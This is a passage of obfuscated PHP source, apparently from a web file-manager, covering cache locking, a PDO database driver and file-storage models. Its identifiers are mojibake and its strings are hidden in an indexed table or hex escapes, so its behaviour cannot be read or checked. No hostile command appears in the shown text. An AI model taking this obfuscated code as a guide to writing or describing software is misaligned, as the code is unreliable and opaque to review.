lockGet($¸Š—§úİ) { $¬Úµ‰ªı =& $_SERVER[íïàËŸë]; $Ù°ªè = rtrim(self::$cachePath, $¬Úµ‰ªı[8]) . $¬Úµ‰ªı[953] . md5($¸Š—§úİ) . $¬Úµ‰ªı[950]; return file_exists($Ù°ªè); } public function unlock($…¾ğ­) { $Ø¨Å™ğ =& $_SERVER[íïàËŸë]; $î¢õáÊé = self::$caches[$…¾ğ­]; if (!$î¢õáÊé) { return; } @flock($î¢õáÊé[$Ø¨Å™ğ[955]], LOCK_UN); @fclose($î¢õáÊé[$Ø¨Å™ğ[955]]); @unlink($î¢õáÊé[$Ø¨Å™ğ[230]]); unset(self::$caches[$…¾ğ­]); } } class CacheLockRedis { public function lock($õ‹ûÓå, $³ù³é¦‘ = 10) { $åû£é“Á = Cache::init(); $±ªøãîÖ = microtime(!0) + $³ù³é¦‘; while (microtime(!0) < $±ªøãîÖ) { $Ûƒ±±Çá = $åû£é“Á->get($õ‹ûÓå); if (!$Ûƒ±±Çá) { $ÓûØ¨¯¯ = $åû£é“Á->setLock($õ‹ûÓå, $±ªøãîÖ, $³ù³é¦‘); if ($ÓûØ¨¯¯) { return !0; } } else { if ($Ûƒ±±Çá < microtime(!0)) { $åû£é“Á->set($õ‹ûÓå, $±ªøãîÖ, $³ù³é¦‘ * 2); if ($åû£é“Á->get($õ‹ûÓå) === $Ûƒ±±Çá) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¯İ÷ƒà) { return Cache::init()->get($¯İ÷ƒà); } public function unlock($™û‹î°à) { return Cache::init()->remove($™û‹î°à); } } class CacheLockMemcached { public function lock($À™¿„š, $ÒÉ…–º‘ = 0) { $¤“ë˜€ = Cache::init(); $Ğ¦«âé¥ = microtime(!0) + $ÒÉ…–º‘; while (microtime(!0) < $Ğ¦«âé¥) { $˜ÂÕ—ŒÂ = $¤“ë˜€->get($À™¿„š); if (!$˜ÂÕ—ŒÂ || $˜ÂÕ—ŒÂ < microtime(!0)) { $½À™½©² = $¤“ë˜€->handle->add($À™¿„š, $Ğ¦«âé¥, $ÒÉ…–º‘); if ($½À™½©²) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($­Îë—ë‘) { return Cache::init()->get($­Îë—ë‘); } public function unlock($šğüà‹) { return Cache::init()->remove($šğüà‹); } } goto dª÷ª¬Õï; F¨Ä¯Ğ“Ï: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ƒ“’òÆ = '') { $î…®ø´ø =& $_SERVER[íïàËŸë]; if (!class_exists($î…®ø´ø[1003])) { think_exception(think_lang($î…®ø´ø[14]) . $î…®ø´ø[1004]); } if (!empty($ƒ“’òÆ)) { $this->config = $ƒ“’òÆ; if (empty($this->config[$î…®ø´ø[17]])) { $this->config[$î…®ø´ø[17]] = array(); } } } public function connect($•¬›ê·Ú = '', $„ºñã“Ç = 0) { $Ê§¢¢ÕÍ =& $_SERVER[íïàËŸë]; if (!isset($this->linkID[$„ºñã“Ç])) { if (empty($•¬›ê·Ú)) { $•¬›ê·Ú = $this->config; } $Üäœ™È¾ = !empty($•¬›ê·Ú[$Ê§¢¢ÕÍ[17]][$Ê§¢¢ÕÍ[18]]) ? $•¬›ê·Ú[$Ê§¢¢ÕÍ[17]][$Ê§¢¢ÕÍ[18]] : $this->pconnect; if ($Üäœ™È¾) { $•¬›ê·Ú[$Ê§¢¢ÕÍ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$„ºñã“Ç] = new PDO($•¬›ê·Ú[$Ê§¢¢ÕÍ[1005]], $•¬›ê·Ú[$Ê§¢¢ÕÍ[977]], $•¬›ê·Ú[$Ê§¢¢ÕÍ[978]], $•¬›ê·Ú[$Ê§¢¢ÕÍ[17]]); } catch (PDOException $Êˆù¦•¯) { think_exception($Êˆù¦•¯->getMessage()); } $this->dbType = $this->_getDsnType($•¬›ê·Ú[$Ê§¢¢ÕÍ[1005]]); if (in_array($this->dbType, array($Ê§¢¢ÕÍ[1006], $Ê§¢¢ÕÍ[1007], $Ê§¢¢ÕÍ[1008], $Ê§¢¢ÕÍ[1009]))) { think_exception($Ê§¢¢ÕÍ[1010] . $this->dbType . $Ê§¢¢ÕÍ[1011] . $this->dbType . $Ê§¢¢ÕÍ[1012]); } if (!$this->linkID[$„ºñã“Ç]) { think_exception($Ê§¢¢ÕÍ[1013]); } try { $this->linkID[$„ºñã“Ç]->exec($Ê§¢¢ÕÍ[1014] . think_config($Ê§¢¢ÕÍ[980])); } catch (Exception $Êˆù¦•¯) { } $this->connected = !0; if (1 != think_config($Ê§¢¢ÕÍ[22])) { unset($this->config); } } return $this->linkID[$„ºñã“Ç]; } public function free() { $this->PDOStatement = null; } public function query($ºĞ›õÙÖ, $¹óÕ¼¼ = array()) { $áçåŸ­ =& $_SERVER[íïàËŸë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ºĞ›õÙÖ; if (!empty($¹óÕ¼¼)) { $this->queryStr .= $áçåŸ­[1015] . print_r($¹óÕ¼¼, !0) . $áçåŸ­[1016]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($áçåŸ­[23], 1); think_status($áçåŸ­[24]); $this->PDOStatement = $this->_linkID->prepare($ºĞ›õÙÖ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $£µÛØéû = $this->PDOStatement->execute($¹óÕ¼¼); $this->debug(); if (!1 === $£µÛØéû) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¼Çµ“ÜÁ, $ë™×şÕĞ = array()) { $àé«æ‚ =& $_SERVER[íïàËŸë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¼Çµ“ÜÁ; if (!empty($ë™×şÕĞ)) { $this->queryStr .= $àé«æ‚[1015] . print_r($ë™×şÕĞ, !0) . $àé«æ‚[1016]; } $Ë¾™ÎîÇ = !1; if ($this->dbType == $àé«æ‚[1009]) { if (preg_match($àé«æ‚[1017], $this->queryStr, $µ¶¾«ù)) { $this->table = think_config($àé«æ‚[1018]) . str_ireplace(think_config($àé«æ‚[1019]), $àé«æ‚[454], $µ¶¾«ù[2]); $Ë¾™ÎîÇ = (bool) $this->query($àé«æ‚[1020] . strtoupper($this->table) . $àé«æ‚[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($àé«æ‚[25], 1); think_status($àé«æ‚[24]); $this->PDOStatement = $this->_linkID->prepare($¼Çµ“ÜÁ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Şì¦Ã„Ê = $this->PDOStatement->execute($ë™×şÕĞ); $this->debug(); if (!1 === $Şì¦Ã„Ê) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ë¾™ÎîÇ || preg_match($àé«æ‚[1021], $¼Çµ“ÜÁ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•¹…ÎÛ” = $this->_linkID->commit(); $this->transTimes = 0; if (!$•¹…ÎÛ”) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $µª¡±ìô = $this->_linkID->rollback(); $this->transTimes = 0; if (!$µª¡±ìô) { $this->error(); return !1; } } return !0; } private function getAll() { $Ê°…ë·’ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ê°…ë·’); return $Ê°…ë·’; } public function getFields($Óù¯±Ü) { $‹Š†‰³¥ =& $_SERVER[íïàËŸë]; $this->initConnect(!0); if (think_config($‹Š†‰³¥[1022])) { $Ë‰‰Ç£± = str_replace($‹Š†‰³¥[1023], $Óù¯±Ü, think_config($‹Š†‰³¥[1022])); } else { switch ($this->dbType) { case $‹Š†‰³¥[1006]: case $‹Š†‰³¥[1024]: $Ë‰‰Ç£± = "\123\105\114\x45\103\x54\x20\x20\x20\x63\157\x6c\x75\x6d\156\x5f\x6e\x61\155\145\x20\141\x73\x20\47\116\141\x6d\145\x27\54\x20\x20\x20\144\x61\164\x61\x5f\164\171\x70\145\40\x61\x73\x20\x27\124\x79\x70\145\47\x2c\x20\x20\x20\143\157\154\165\155\156\137\x64\x65\146\141\165\x6c\x74\x20\141\163\40\x27\x44\145\x66\x61\165\154\x74\x27\x2c\40\40\40\x69\163\137\x6e\x75\154\x6c\x61\x62\x6c\145\x20\x61\x73\40\47\x4e\165\x6c\154\47\xa\11\11\x46\122\x4f\115\11\151\156\146\x6f\x72\x6d\141\x74\x69\157\x6e\137\163\x63\150\145\155\141\56\164\141\x62\x6c\145\163\x20\x41\x53\x20\164\12\x9\11\x4a\117\111\116\x9\151\156\146\x6f\162\x6d\141\x74\x69\x6f\x6e\x5f\x73\x63\150\145\x6d\141\x2e\x63\x6f\x6c\165\x6d\156\163\40\x41\123\x20\x63\xa\11\x9\117\116\x20\x20\164\x2e\164\x61\142\x6c\145\137\x63\141\164\x61\154\157\147\x20\75\x20\x63\56\164\141\142\x6c\x65\x5f\143\x61\x74\141\154\157\147\12\11\x9\x41\x4e\104\x20\164\x2e\x74\141\142\154\x65\137\x73\143\150\145\155\x61\x20\75\x20\x63\x2e\x74\141\142\154\145\137\163\x63\x68\x65\x6d\141\12\x9\11\x41\x4e\x44\40\164\x2e\164\x61\x62\154\145\x5f\156\x61\x6d\x65\40\x3d\40\143\x2e\164\141\x62\154\x65\137\156\x61\155\x65\xa\x9\11\127\110\x45\122\105\40\40\40\x74\56\164\141\x62\154\145\137\x6e\x61\x6d\x65\40\75\x20\x27{$Óù¯±Ü}\x27"; break; case $‹Š†‰³¥[1025]: $Ë‰‰Ç£± = $‹Š†‰³¥[1026] . $Óù¯±Ü . $‹Š†‰³¥[1027]; break; case $‹Š†‰³¥[1007]: case $‹Š†‰³¥[1009]: $Ë‰‰Ç£± = $‹Š†‰³¥[1028] . $‹Š†‰³¥[1029] . $‹Š†‰³¥[1030] . strtoupper($Óù¯±Ü) . $‹Š†‰³¥[1031] . strtoupper($Óù¯±Ü) . $‹Š†‰³¥[1032]; break; case $‹Š†‰³¥[1033]: $Ë‰‰Ç£± = $‹Š†‰³¥[1034] . $Óù¯±Ü . $‹Š†‰³¥[1035]; break; case $‹Š†‰³¥[1008]: break; case $‹Š†‰³¥[1036]: default: $Ë‰‰Ç£± = $‹Š†‰³¥[1037] . ($this->dbType == $‹Š†‰³¥[1036] ? "\x60{$Óù¯±Ü}\140" : $Óù¯±Ü); } } $—´àç¦™ = $this->query($Ë‰‰Ç£±); $‚ˆ¥šµº = array(); if ($—´àç¦™) { foreach ($—´àç¦™ as $ÓÌœí‡ö => $ùÚƒàÌš) { $ùÚƒàÌš = array_change_key_case($ùÚƒàÌš); $ùÚƒàÌš[$‹Š†‰³¥[32]] = isset($ùÚƒàÌš[$‹Š†‰³¥[32]]) ? $ùÚƒàÌš[$‹Š†‰³¥[32]] : $‹Š†‰³¥[454]; $ùÚƒàÌš[$‹Š†‰³¥[33]] = isset($ùÚƒàÌš[$‹Š†‰³¥[33]]) ? $ùÚƒàÌš[$‹Š†‰³¥[33]] : $‹Š†‰³¥[454]; $®¹‰ªäÂ = isset($ùÚƒàÌš[$‹Š†‰³¥[350]]) ? $ùÚƒàÌš[$‹Š†‰³¥[350]] : $ùÚƒàÌš[$‹Š†‰³¥[32]]; $‚ˆ¥šµº[$®¹‰ªäÂ] = array($‹Š†‰³¥[32] => $®¹‰ªäÂ, $‹Š†‰³¥[33] => $ùÚƒàÌš[$‹Š†‰³¥[33]], $‹Š†‰³¥[35] => (bool) (isset($ùÚƒàÌš[$‹Š†‰³¥[106]]) && $ùÚƒàÌš[$‹Š†‰³¥[106]] === $‹Š†‰³¥[12] || isset($ùÚƒàÌš[$‹Š†‰³¥[35]]) && $ùÚƒàÌš[$‹Š†‰³¥[35]] === $‹Š†‰³¥[12]), $‹Š†‰³¥[37] => isset($ùÚƒàÌš[$‹Š†‰³¥[37]]) ? $ùÚƒàÌš[$‹Š†‰³¥[37]] : (isset($ùÚƒàÌš[$‹Š†‰³¥[56]]) ? $ùÚƒàÌš[$‹Š†‰³¥[56]] : $‹Š†‰³¥[454]), $‹Š†‰³¥[39] => isset($ùÚƒàÌš[$‹Š†‰³¥[97]]) ? strtolower($ùÚƒàÌš[$‹Š†‰³¥[97]]) == $‹Š†‰³¥[41] : (isset($ùÚƒàÌš[$‹Š†‰³¥[57]]) ? $ùÚƒàÌš[$‹Š†‰³¥[57]] : !1), $‹Š†‰³¥[42] => isset($ùÚƒàÌš[$‹Š†‰³¥[1038]]) ? strtolower($ùÚƒàÌš[$‹Š†‰³¥[1038]]) == $‹Š†‰³¥[44] : (isset($ùÚƒàÌš[$‹Š†‰³¥[97]]) ? $ùÚƒàÌš[$‹Š†‰³¥[97]] : !1)); } } return $‚ˆ¥šµº; } public function getTables($À—´Ø¬Ø = '') { $ŠÆÌÈûØ =& $_SERVER[íïàËŸë]; if (think_config($ŠÆÌÈûØ[1039])) { $ŒÁ Û‰Š = str_replace($ŠÆÌÈûØ[1040], $À—´Ø¬Ø, think_config($ŠÆÌÈûØ[1039])); } else { switch ($this->dbType) { case $ŠÆÌÈûØ[1007]: case $ŠÆÌÈûØ[1009]: $ŒÁ Û‰Š = $ŠÆÌÈûØ[1041]; break; case $ŠÆÌÈûØ[1006]: case $ŠÆÌÈûØ[1024]: $ŒÁ Û‰Š = $ŠÆÌÈûØ[1042]; break; case $ŠÆÌÈûØ[1033]: $ŒÁ Û‰Š = $ŠÆÌÈûØ[1043]; break; case $ŠÆÌÈûØ[1008]: think_exception(think_lang($ŠÆÌÈûØ[1044]) . $ŠÆÌÈûØ[1045]); break; case $ŠÆÌÈûØ[1025]: $ŒÁ Û‰Š = $ŠÆÌÈûØ[45] . $ŠÆÌÈûØ[46] . $ŠÆÌÈûØ[47]; break; case $ŠÆÌÈûØ[1036]: default: if (!empty($À—´Ø¬Ø)) { $ŒÁ Û‰Š = $ŠÆÌÈûØ[988] . $À—´Ø¬Ø . $ŠÆÌÈûØ[989]; } else { $ŒÁ Û‰Š = $ŠÆÌÈûØ[990]; } } } $ ìÙ³¹¢ = $this->query($ŒÁ Û‰Š); $÷·ÔîÛ† = array(); foreach ($ ìÙ³¹¢ as $Ôö§Ñ‰Ù => $Æ¡ùíåÀ) { $÷·ÔîÛ†[$Ôö§Ñ‰Ù] = current($Æ¡ùíåÀ); } return $÷·ÔîÛ†; } protected function parseLimit($½Şœ¥ä¦) { $£®Õ§¾ê =& $_SERVER[íïàËŸë]; $½¶Ğò’· = $£®Õ§¾ê[12]; if (!empty($½Şœ¥ä¦)) { switch ($this->dbType) { case $£®Õ§¾ê[1033]: case $£®Õ§¾ê[1025]: $½Şœ¥ä¦ = explode($£®Õ§¾ê[50], $½Şœ¥ä¦); if (count($½Şœ¥ä¦) > 1) { $½¶Ğò’· .= $£®Õ§¾ê[51] . $½Şœ¥ä¦[1] . $£®Õ§¾ê[52] . $½Şœ¥ä¦[0] . $£®Õ§¾ê[53]; } else { $½¶Ğò’· .= $£®Õ§¾ê[51] . $½Şœ¥ä¦[0] . $£®Õ§¾ê[53]; } break; case $£®Õ§¾ê[1006]: case $£®Õ§¾ê[1024]: break; case $£®Õ§¾ê[1008]: break; case $£®Õ§¾ê[1007]: case $£®Õ§¾ê[1009]: break; case $£®Õ§¾ê[1036]: default: $½¶Ğò’· .= $£®Õ§¾ê[51] . $½Şœ¥ä¦ . $£®Õ§¾ê[53]; } } return $½¶Ğò’·; } public function parseKey(&$™ô•‹Û®, $¹ƒõí³ß = true) { $ƒòƒ¯ğ¿ =& $_SERVER[íïàËŸë]; if ($¹ƒõí³ß) { $™ô•‹Û® = $this->parseKeyCheck($™ô•‹Û®); } if ($this->dbType == $ƒòƒ¯ğ¿[1036]) { if ($™ô•‹Û® != $ƒòƒ¯ğ¿[220] && !preg_match($ƒòƒ¯ğ¿[1000], $™ô•‹Û®)) { $™ô•‹Û® = $ƒòƒ¯ğ¿[461] . trim($™ô•‹Û®, $ƒòƒ¯ğ¿[461]) . $ƒòƒ¯ğ¿[461]; } return $™ô•‹Û®; } else { return parent::parseKey($™ô•‹Û®, $¹ƒõí³ß); } } public function close() { $this->_linkID = null; } public function error() { $Ê–ı­äú =& $_SERVER[íïàËŸë]; if ($this->PDOStatement) { $„ÙÜÑÜì = $this->PDOStatement->errorInfo(); $this->error = $„ÙÜÑÜì[1] . $Ê–ı­äú[4] . $„ÙÜÑÜì[2]; } else { $this->error = $Ê–ı­äú[12]; } if ($Ê–ı­äú[12] != $this->queryStr) { $this->error .= LNG($Ê–ı­äú[48]) . $this->queryStr; } think_trace($this->error, $Ê–ı­äú[12], $Ê–ı­äú[49]); return $this->error; } public function escapeString($ÖƒÎüû„) { $ïÔõë‘Ì =& $_SERVER[íïàËŸë]; switch ($this->dbType) { case $ïÔõë‘Ì[1033]: case $ïÔõë‘Ì[1006]: case $ïÔõë‘Ì[1024]: case $ïÔõë‘Ì[1036]: return addslashes($ÖƒÎüû„); case $ïÔõë‘Ì[1008]: case $ïÔõë‘Ì[1025]: case $ïÔõë‘Ì[1007]: case $ïÔõë‘Ì[1009]: return str_ireplace($ïÔõë‘Ì[58], $ïÔõë‘Ì[59], $ÖƒÎüû„); } } protected function parseValue($¾¡¼¥û) { $ªèëÑƒ =& $_SERVER[íïàËŸë]; if (is_string($¾¡¼¥û)) { $°Â÷øâè = strpos($¾¡¼¥û, $ªèëÑƒ[4]) === 0 && in_array($¾¡¼¥û, array_keys($this->bind)); $¾¡¼¥û = $°Â÷øâè ? $this->escapeString($¾¡¼¥û) : $ªèëÑƒ[1046] . $this->escapeString($¾¡¼¥û) . $ªèëÑƒ[1046]; } elseif (isset($¾¡¼¥û[0]) && is_string($¾¡¼¥û[0]) && strtolower($¾¡¼¥û[0]) == $ªèëÑƒ[373]) { $¾¡¼¥û = $this->escapeString($¾¡¼¥û[1]); } elseif (is_array($¾¡¼¥û)) { $¾¡¼¥û = array_map(array($this, $ªèëÑƒ[1047]), $¾¡¼¥û); } elseif (is_bool($¾¡¼¥û)) { $¾¡¼¥û = $¾¡¼¥û ? $ªèëÑƒ[91] : $ªèëÑƒ[228]; } elseif (is_null($¾¡¼¥û)) { $¾¡¼¥û = $ªèëÑƒ[106]; } return $¾¡¼¥û; } public function getLastInsertId() { $¯†´´›İ =& $_SERVER[íïàËŸë]; switch ($this->dbType) { case $¯†´´›İ[1033]: case $¯†´´›İ[1025]: case $¯†´´›İ[1006]: case $¯†´´›İ[1024]: case $¯†´´›İ[1008]: case $¯†´´›İ[1036]: return $this->_linkID->lastInsertId(); case $¯†´´›İ[1007]: case $¯†´´›İ[1009]: $âìç¾´â = $this->table; $ó¢˜™ûª = $this->query("\x53\105\x4c\x45\103\x54\40{$âìç¾´â}\x2e\x63\x75\x72\x72\x76\141\154\40\143\x75\162\162\166\141\x6c\x20\106\x52\117\x4d\40\x64\165\141\154"); return $ó¢˜™ûª ? $ó¢˜™ûª[0][$¯†´´›İ[1048]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¾´†›Êì) { $şì¢‚²‹ =& $_SERVER[íïàËŸë]; if (!CacheLock::fileLock($şì¢‚²‹[13])) { return !1; } $ëÆ’´ÜÉ = parent::query($¾´†›Êì); CacheLock::fileUnLock($şì¢‚²‹[13]); return $ëÆ’´ÜÉ; } public function execute($²½”Ôíî) { $£¥å¥¨á =& $_SERVER[íïàËŸë]; if (!CacheLock::fileLock($£¥å¥¨á[13])) { return !1; } $óç©Ù¥ = parent::execute($²½”Ôíî); CacheLock::fileUnLock($£¥å¥¨á[13]); return $óç©Ù¥; } } class DbSqlite3 extends DbSqlite3Base { public function query($¨×¸ûÌ) { $Ó¯™ÕüÆ =& $_SERVER[íïàËŸë]; if (!CacheLock::fileLock($Ó¯™ÕüÆ[13])) { return !1; } $”ù×İõÃ = parent::query($¨×¸ûÌ); CacheLock::fileUnLock($Ó¯™ÕüÆ[13]); return $”ù×İõÃ; } public function execute($Èã§õ ­) { $–á¨–…¡ =& $_SERVER[íïàËŸë]; if (!CacheLock::fileLock($–á¨–…¡[13])) { return !1; } $»‰ƒ ‘ƒ = parent::execute($Èã§õ ­); CacheLock::fileUnLock($–á¨–…¡[13]); return $»‰ƒ ‘ƒ; } } goto bõ²Â¡ÙÎ²; D½Ë¯‚ÙÊ¨: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\154\145\x5f\143\157\x6e\164\x65\156\164\163"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\163\x65\x72\x74", "\x66\165\156\x63\x74\x69\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\155\x65" => "\151\x6f\137\x66\151\x6c\145\x5f\x6d\x65\164\x61", "\x6d\x65\164\x61\106\x69\145\154\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($â²ÁöÕ˜) { $ºŞäïôª =& $_SERVER[íïàËŸë]; static $â‰œ½Ó³ = array(); if (!isset($â‰œ½Ó³[$â²ÁöÕ˜])) { $áÉ±ğŒ‘ = $ºŞäïôª[2030]; $ò³Âö“Õ = Model($ºŞäïôª[544])->field($áÉ±ğŒ‘)->where(array($ºŞäïôª[542] => $â²ÁöÕ˜))->find(); $â‰œ½Ó³[$â²ÁöÕ˜] = $ò³Âö“Õ; } return $â‰œ½Ó³[$â²ÁöÕ˜]; } public function addFileByContent($ùÂ¹úı = '', $·ªÓ‡ø = '') { $ˆŸĞŠô¹ =& $_SERVER[íïàËŸë]; $Ã« Ü™ş = TEMP_PATH . $ˆŸĞŠô¹[2031]; if (!is_dir($Ã« Ü™ş)) { mk_dir($Ã« Ü™ş); } $ÛÍÑò‡å = $Ã« Ü™ş . $ˆŸĞŠô¹[2032] . rand_string(16); file_put_contents($ÛÍÑò‡å, $ùÂ¹úı); $¤”—ÜÏù = $this->addFile($ÛÍÑò‡å, $·ªÓ‡ø, !0); if (file_exists($ÛÍÑò‡å)) { @unlink($ÛÍÑò‡å); } return $¤”—ÜÏù; } public function createFileName($”ÈÛÌ‚Å, $çË­üËª = false, $­şîíÃ¹ = false) { $º“¦ş¡º =& $_SERVER[íïàËŸë]; $‰¨®ØğÒ = IO::init($º“¦ş¡º[8]); $üúÄåæ† = $this->makeFilePath($”ÈÛÌ‚Å, $‰¨®ØğÒ, $çË­üËª, $­şîíÃ¹); $ãÃóõ• = $‰¨®ØğÒ->pathFather($üúÄåæ†); static $ÄßášÀ¹ = false; $­é§ÜŞ = $º“¦ş¡º[2033] . md5($ãÃóõ•); if (!$ÄßášÀ¹ && !Cache::get($­é§ÜŞ)) { $ÄßášÀ¹ = !0; $¢×Ù¢ƒ = IO::mkdir($ãÃóõ•); if (!IO::exist($¢×Ù¢ƒ . $º“¦ş¡º[880])) { IO::mkfile($¢×Ù¢ƒ . $º“¦ş¡º[880]); } Cache::set($­é§ÜŞ, 1, 3600 * 2); } return $üúÄåæ†; } public function makeFilePath($À§’Õ†, $ıõ™¥½Ù, $åï¼Ëà¥ = false, $ôÄá±µ¥ = false) { $Û–òÄ˜ø =& $_SERVER[íïàËŸë]; $ÖÜã¤£‹ = Model($Û–òÄ˜ø[853])->get($Û–òÄ˜ø[2034]); $á„¹®¬Ş = KodIO::defaultIO() . date($Û–òÄ˜ø[2035]); $´²®¾‹ = $á„¹®¬Ş . rand_string(5) . short_id(100); $À§’Õ† = str_replace($Û–òÄ˜ø[8], $Û–òÄ˜ø[11], KodIO::clear($À§’Õ†)); $ÜœÕŠˆ = $ıõ™¥½Ù->ext($À§’Õ†); if (!$À§’Õ†) { $ÖÜã¤£‹ = $Û–òÄ˜ø[859]; } switch ($ÖÜã¤£‹) { case $Û–òÄ˜ø[2036]: if ($ÜœÕŠˆ) { $´²®¾‹ = $´²®¾‹ . $Û–òÄ˜ø[10] . $ÜœÕŠˆ; } if ($ÜœÕŠˆ == $Û–òÄ˜ø[1973]) { $´²®¾‹ .= $Û–òÄ˜ø[1302]; } break; case $Û–òÄ˜ø[2037]: $¶¸è = Model($Û–òÄ˜ø[853])->get($Û–òÄ˜ø[854]); $õàœ¢Ë = substr(md5($Û–òÄ˜ø[855] . $¶¸è . date($Û–òÄ˜ø[832])), 0, 8); $ô¶Ã÷ÊÎ = KodIO::defaultDriver(); $á„¹®¬Ş = $Û–òÄ˜ø[1333] . $ô¶Ã÷ÊÎ[$Û–òÄ˜ø[475]] . $Û–òÄ˜ø[484] . date($Û–òÄ˜ø[2038]) . $õàœ¢Ë . $Û–òÄ˜ø[8]; if ($ÜœÕŠˆ == $Û–òÄ˜ø[1973]) { $À§’Õ† .= $Û–òÄ˜ø[1302]; } $«­ş¦Õõ = $Û–òÄ˜ø[2039] . $á„¹®¬Ş . $À§’Õ†; CacheLock::lock($«­ş¦Õõ); $´²®¾‹ = $á„¹®¬Ş . $À§’Õ†; if (IO::exist($á„¹®¬Ş . $À§’Õ†)) { $¿ªÃƒ… = substr($À§’Õ†, 0, strlen($À§’Õ†) - strlen($ÜœÕŠˆ)); $¡€†Ø´ = $ôÄá±µ¥ ? substr($ôÄá±µ¥, 0, 5) : ($åï¼Ëà¥ ? substr($åï¼Ëà¥, 0, 5) : rand_string(5)); $´²®¾‹ = $á„¹®¬Ş . $¿ªÃƒ… . $¡€†Ø´; if ($ÜœÕŠˆ) { $´²®¾‹ = $´²®¾‹ . $Û–òÄ˜ø[10] . $ÜœÕŠˆ; } } if (IO::isOsDriver($´²®¾‹) && !IO::isUploadServer($´²®¾‹)) { if (IO::exist($´²®¾‹)) { return $´²®¾‹; } $à×ÓÎ•¾ = IO::setContent($´²®¾‹, $Û–òÄ˜ø[12]); if (!$à×ÓÎ•¾) { show_json($Û–òÄ˜ø[2040], !1); } } CacheLock::unlock($«­ş¦Õõ); break; case $Û–òÄ˜ø[859]: break; default: break; } return $´²®¾‹; } public function addFileByRemote($òÊÄıåŞ, $ıÓ×¾ÕÕ, $Å£œåó = array()) { $¯Áƒ‡Œ =& $_SERVER[íïàËŸë]; if (!IO::exist($òÊÄıåŞ)) { return !1; } $˜í¥çŠ = $Å£œåó[$¯Áƒ‡Œ[547]] ? $Å£œåó[$¯Áƒ‡Œ[547]] : $¯Áƒ‡Œ[12]; $”ï¸Ù¦í = IO::hashMd5($òÊÄıåŞ, $˜í¥çŠ); $µß£üµ¡ = KodIO::defaultDriver(); $—ßÁ¼Ù¢ = array($¯Áƒ‡Œ[617] => IO::size($òÊÄıåŞ), $¯Áƒ‡Œ[2041] => 1, $¯Áƒ‡Œ[494] => $ıÓ×¾ÕÕ, $¯Áƒ‡Œ[891] => $µß£üµ¡[$¯Áƒ‡Œ[475]], $¯Áƒ‡Œ[495] => $òÊÄıåŞ, $¯Áƒ‡Œ[2042] => $Å£œåó[$¯Áƒ‡Œ[672]] ? $Å£œåó[$¯Áƒ‡Œ[672]] : IO::hashSimple($òÊÄıåŞ), $¯Áƒ‡Œ[2043] => $”ï¸Ù¦í ? $”ï¸Ù¦í : $˜í¥çŠ); if ($Üğ„ë½Ë = $this->addFileCheckExist($—ßÁ¼Ù¢[$¯Áƒ‡Œ[672]], $—ßÁ¼Ù¢[$¯Áƒ‡Œ[547]], $—ßÁ¼Ù¢[$¯Áƒ‡Œ[79]])) { return $Üğ„ë½Ë; } return $this->addFileData($—ßÁ¼Ù¢); } private function addFileData($™³÷ÌÈÆ) { $ºø…ÔĞï =& $_SERVER[íïàËŸë]; if (!$™³÷ÌÈÆ) { return !1; } $™³÷ÌÈÆ[$ºø…ÔĞï[79]] = intval($™³÷ÌÈÆ[$ºø…ÔĞï[79]]); if (!$™³÷ÌÈÆ[$ºø…ÔĞï[79]] && strlen($™³÷ÌÈÆ[$ºø…ÔĞï[672]]) > 32) { $™³÷ÌÈÆ[$ºø…ÔĞï[79]] = intval(substr($™³÷ÌÈÆ[$ºø…ÔĞï[672]], 32)); } $Ïåê÷ = $this->add($™³÷ÌÈÆ); return $this->find($Ïåê÷); } public function addFile($Ä…ãŒêİ, $÷”±äıÌ, $ó»œŸ ¹ = false) { $ÊÌßõÄ =& $_SERVER[íïàËŸë]; $Øõ‡¸õ‹ = IO::hashSimple($Ä…ãŒêİ); $Û´Íî´ş = IO::size($Ä…ãŒêİ); $‘¾éÈÒ = $Û´Íî´ş <= 1024 * 1024 * 10 ? IO::hashMd5($Ä…ãŒêİ) : $ÊÌßõÄ[12]; $ïâ©­ò = $ÊÌßõÄ[2044] . $Øõ‡¸õ‹; CacheLock::lock($ïâ©­ò); if ($‘¾éÈÒ && $Øõ‡¸õ‹) { $ğÒê¥ˆû = $this->addFileCheckExist($Øõ‡¸õ‹, $‘¾éÈÒ, $Û´Íî´ş); if ($ğÒê¥ˆû) { CacheLock::unlock($ïâ©­ò); return $ğÒê¥ˆû; } } $³üØç” = $this->addFileMake($Ä…ãŒêİ, $Û´Íî´ş, $Øõ‡¸õ‹, $‘¾éÈÒ, $÷”±äıÌ, $ó»œŸ ¹); $øÁÄ‡¦® = $this->addFileData($³üØç”); CacheLock::unlock($ïâ©­ò); if (!$‘¾éÈÒ && $øÁÄ‡¦®) { $this->fileMd5Check($øÁÄ‡¦®); } return $øÁÄ‡¦®; } public function fileMd5Check($ ¼¡ûÆ¯) { $ş·Š™¡ş =& $_SERVER[íïàËŸë]; $ÕñáÆÀ = array($ ¼¡ûÆ¯[$ş·Š™¡ş[541]], $ ¼¡ûÆ¯[$ş·Š™¡ş[87]]); $Ù­¦Ô¡ş = $ş·Š™¡ş[2045] . $ 